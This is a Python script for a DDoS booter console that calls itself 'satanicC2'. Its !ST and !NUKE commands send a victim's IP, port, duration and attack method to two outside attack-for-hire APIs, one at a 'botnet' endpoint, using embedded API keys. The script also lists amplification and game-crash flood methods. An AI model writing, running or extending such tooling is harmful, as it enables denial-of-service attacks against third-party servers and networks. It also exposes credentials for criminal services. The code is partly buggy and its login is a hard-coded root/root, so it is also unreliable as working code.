import time
import signal
import os
import sys
import random
try:
    import requests
except:
    os.system('pip3 install requests')
    time.sleep(3)
    import requests

banner = """
\033[33m                                           
 )\ )         )                     (      )  
(()/(    ) ( /(   )      (          )\  ( /(
 /(_))( /( )\()| /(  (   )\  (    (((_) )(_))\033[0m  
\033[31m(_))  )(_)|_))/)(_)) )\ |(_) )\   )\___((_)   
/ __|((_)_| |_((_)_ _(_/((_)((_) ((/ __|_  )  
\__ \/ _` |  _/ _` | ' \)) / _|   | (__ / /   
|___/\__,_|\__\__,_|_||_||_\__|    \___/___|\033[0m"""

helpp = """\033[33m
!ST, Send a DDoS attack through TopSecurityTeamAPI
!NUKE, Send a DDoS attack through NukeTownAPI
clear, clear the screen
\033[0m
\033[31mhelp, shows this screen :>
methods, shows each API's methods :>
ping, ping a ip address :>
\033[0m
\033[34muser, shows current users plan :>
whois, get info on a ip :>
\033[0m
"""

methods = """
\033[31m
UDPBYPASS: UDPBYPASS,
HOME: home method,
ARD: ARD,
DNS: DNS,
MEMCACHED: MEMCACHED,
STUN: STUN,
DVR: DVR,
MDNS": MDNS,
SYN-X: SYN-X,
100UP-TCP: 100UP-TCP,
NFO-KILLER: NFO-KILLER,
NFO-KILLERV2: NFO-KILLER,
GAME-CRASH: GAME-CRASH",
FN-LAG: FN-LAG,
R6-LAG: R6-LAG,
2K-DROP: 2K-DROP,
WARZONE: WARZONE,
AUTOBYPASS : AUTOBYPASS,
\033[0m
"""

methods0 = """\033[34m
    AMP-CLDAP: AMP-CLDAP,
    LDAP: home method,
    OVH-FLY: OVH SLAM,
    OVH-SPAM: MULTI OVH-FLY,
    100UP-STORM: SLAMS 100UPS,
    FLUNK: COOL METHOD,
    MULTISYN: MULTISYN,
    WRA-KILL: NULLS NFOS,
    RAW: RAW,
    BROWSER-FLYJS: HTTPS,
    HTTPS-VIP: HTTPS,
    HTTPS-STORM: NFO-KILLER,
    R6-FLY: RAINBOW,
    ZOOM-FLY: ZOOM,
    FIVEM-FLY: FIVEM-FLY,
    DVR-KILL: DVR-KILL,
    GAME-FLY: WARZONE,
    GAME-STORM: AUTOBYPASS
\033[0m
"""

api2methods  = {
    "AMP-CLDAP": "AMP-CLDAP",
    "LDAP": "home method",
    "OVH-FLY": "OVH SLAMS",
    "OVH-SPAM": "MULTI OVH-FLY",
    "100UP-STORM": "SLAMS 100UPS",
    "FLUNK": "COOL METHOD",
    "MULTISYN": "MULTISYN",
    "WRA-KILL": "NULLS NFOS",
    "RAW": "RAW",
    "BROWSER-FLYJS": "HTTPS",
    "HTTPS-VIP": "HTTPS",
    "HTTPS-STORM": "NFO-KILLER",
    "R6-FLY": "RAINBOW",
    "ZOOM-FLY": "ZOOM",
    "FIVEM-FLY": "FIVEM-FLY",
    "DVR-KILL": "DVR-KILL",
    "GAME-FLY": "WARZONE",
    "GAME-STORM": "AUTOBYPASS",

}

api1methods  = {
    "UDPBYPASS": "UDPBYPASS",
    "HOME": "home method",
    "ARD": "ARD",
    "DNS": "DNS",
    "MEMCACHED": "MEMCACHED",
    "STUN": "STUN",
    "DVR": "DVR",
    "MDNS": "MDNS",
    "SYN-X": "SYN-X",
    "100UP-TCP": "100UP-TCP",
    "NFO-KILLER": "NFO-KILLER",
    "NFO-KILLERV2": "NFO-KILLER",
    "GAME-CRASH": "GAME-CRASH",
    "FN-LAG": "FN-LAG",
    "R6-LAG": "R6-LAG",
    "2K-DROP": "2K-DROP",
    "WARZONE": "WARZONE",
    "AUTOBYPASS": "AUTOBYPASS",

}

commands = {
    "!attack {host} {port} {time} {method}": "attack a ip",
    "clear": "clear the screen",
    "methods": "show api methods"
}

time.sleep(2)

os.system('cls')

#def auth():
#    numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']
#    number2 = random.choice(numbers)
#    number1 = random.choice(numbers)
#    sum = number1 + number2
#    ans = input(int(number1) + ' + ', + int(number2))
#    if ans != sum:
#        print('Wrong, exiting..')
#        sys.exit()
#    elif ans == sum:
#        print('Correct!')
#        time.sleep(0.7)
#        os.system('cls')
#        pass

def main():
    print(banner)
    while True:
        inp = input('\033[33mroot\033[0m\033[34m@\033[31msatanicC2-> \033[0m')
        if inp == 'clear':
            time.sleep(0.5)
            os.system('cls')
            print(banner)
            main()
        if inp == 'methods':
            print('\033[33mTOP SECURITY TEAM API\033[0m')
            print(methods)
            time.sleep(5)
            os.system('cls')
            print('NukeTownAPI')
            print(methods0)
            time.sleep(5)
            os.system('cls')
            main()
        if inp == '!ST':
            ip = input('Enter IP: ')
            port = input('Enter Port: ')
            timea = input('Enter Time: ')
            method = input('Enter Method: ')
            send = requests.get(f"https://topsecurityteam.com/type/api.php?key=A0yCvqsenCVDuTOs&host={ip}&port={port}&time={timea}&method={method}")
            print(send)
            print(f"attack sent to {ip}, on port {port}, for {timea} seconds, with method {method}")
        if inp == 'help':
            os.system('cls')
            print(helpp)
            time.sleep(5)
            os.system('cls')
            print(banner)
        if inp == 'whois':
            ip = input('Enter IP to search: ')
            info = requests.get(f'https://check-host.net/ip-info?host={ip}')
            print(info)
        if inp == 'ping':
            ip = input('Enter IP To Ping: ')
            ping = os.system(f'ping {ip}')
            print(ping)
        if inp == '!NUKE':
            print("""\033[35mNukeTownAPI\033[0m""")
            ip = input('\033[35mEnter IP: \033[0m')
            port = input('\033[34mEnter Port: \033[0m')
            timea = input('\033[35mEnter Time: \033[0m')
            method = input('\033[34mEnter Method: \033[0m')
            send = requests.get(f"http://api.nuclear-api.cc/botnet/api.php?key=iQZWr6Cm8MfL8cPg&host={ip}&port={port}&time={time}&method={method}")
            print(send)
            print(f"attack sent to {ip}, on port {port}, for {timea} seconds, with method {method}")
        if inp == 'user':
            user = 'root'
            plan = 'Lifetime'
            vip = 'True'
            owner = 'True'
            os.system('cls')
            print('\033[33muser : ' + user)
            print('\033[0m\033[31mplan : ' + plan)
            print('\033[0m\033[33mvip : ' + vip)
            print('\033[0m\033[31mowner : ' + owner)
            time.sleep(5)


def passanduser():
    username = 'root'
    password = 'root'

    given_user = input("Username: ")
    given_pass = input("Password: ")

    if given_user not in username:
        print('Wrong! Exiting')
        sys.exit()
    if given_pass not in password:
        print('Wrong! Exiting')
        sys.exit()
    else:
        print("Correct!")
        time.sleep(0.5)
        os.system('cls')



passanduser()
#auth()
main()
